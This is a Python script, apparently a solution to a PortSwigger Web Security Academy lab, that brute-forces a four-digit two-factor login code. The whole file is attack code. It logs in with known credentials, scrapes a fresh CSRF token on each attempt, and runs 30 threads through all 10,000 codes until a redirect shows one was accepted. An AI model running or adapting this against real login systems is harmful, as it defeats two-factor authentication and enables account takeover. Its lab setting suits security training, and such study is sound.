import requests
import re
from threading import Thread

url="""https://0a5c00da03f351cd812c9db600ad00f3.web-security-academy.net/"""
results = []
def find_mfa_code(i):
        try:
            s = requests.Session() #to keep the cookies
            login = s.get(url + "/login")
            csrf = re.search(r'name="csrf" value="([^"]+)"', login.text).group(1)             #1 to get the first subgroup (the csrf value)
            user_data = {"username":"carlos", "password":"montoya"}
            csrf_dict = {"csrf":csrf}
            csrf_dict.update(user_data)
            login_post = s.post(url+"/login", data=csrf_dict)
            login2 = s.get(url+"/login2")
            csrf2 = re.search(r'name="csrf" value="([^"]+)"', login2.text).group(1)
            csrf_dict2 = {"csrf":csrf2}
            mfa_code = str(i).zfill(4)
            csrf_dict2.update({"mfa-code":mfa_code})
            login_post2 = s.post(url+"/login2", data=csrf_dict2)
            if login_post2.history:
                results.append(mfa_code)
        except requests.exceptions.ConnectionError:
             find_mfa_code(i)

threads = []
max_threads = 30


for i in range(10000):
    t = Thread(target=find_mfa_code, args=(i,))
    threads.append(t)
    t.start()
    if results:
         print(results[0])
         break
    if len(threads) >= max_threads:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()
